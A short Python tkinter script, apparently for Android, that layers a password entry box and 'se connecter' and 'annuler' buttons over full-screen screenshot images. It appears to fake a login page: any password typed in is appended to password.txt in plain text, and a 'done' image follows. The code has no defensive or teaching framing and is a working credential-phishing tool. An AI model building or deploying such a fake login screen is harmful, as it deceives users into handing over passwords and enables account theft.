
from tkinter import * 

win = Tk()
win['bg']="#7D7D7D"

#the images screen are ("720x1600")

first = PhotoImage(file="/storage/emulated/0/azert/Fpage.png")
second= PhotoImage(file="/storage/emulated/0/azert/Spage.png")
done= PhotoImage(file="/storage/emulated/0/azert/done.png")


def btn():
    
    Spage = Label(image= second,bg="#7D7D7D"). place (x = 0,y= 0)
    ent = Entry(win, font=("arial",10), width=27)
    ent.place(x=73,y=400)
    
    def save():
        pwd = ent.get()
        get_pwd = str(pwd)
        with open ("password.txt",'a') as save:
            save.write(get_pwd+"\n")
            Spage = Label(image= done,bg="#7D7D7D"). place (x = 0,y= 0)
            
    conn = Button(win, text ="se connecter",command=save,font=("arial",10),fg="blue",bg="white"). place (x=350,y = 700)
    
    conn = Button(win, text ="annuler",font=("arial",10),fg="black",bg="white"). place (x=90,y = 700)

Fpage = Button(image= first, command=btn,bg="#7D7D7D"). place (x=0,y =0)

mainloop ()
